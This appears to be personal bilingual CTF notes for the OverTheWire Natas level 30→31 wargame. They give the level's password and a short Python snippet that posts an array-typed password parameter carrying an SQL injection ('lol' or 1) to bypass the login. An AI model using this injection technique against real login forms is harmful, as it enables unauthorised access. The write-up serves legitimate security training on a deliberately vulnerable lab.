# Natas Nivel 30 - 31

| Campo | Valor |
|-------|-------|
| **Juego / Game** | Natas |
| **Nivel / Level** | 30 - 31 |
| **URL** | https://overthewire.org/wargames/natas/ |
| **Conexión** | `http://natas30.natas.labs.overthewire.org` |
natas30:WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH


python


def vuln(url):
    params={"username": "natas31", "password": ["'lol' or 1", 4]}
    print(requests.post(url, data=params).text)

---

## Fuentes / Sources

- OTW: https://overthewire.org/wargames/natas/ - fecha de acceso: 2026-09-25.
- Autor notas: Apuromafo.

---

## Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a OverTheWire.
> **EN:** Educational and personal use only. Not affiliated with OverTheWire.

_Fecha de edición: 2026-09-25_
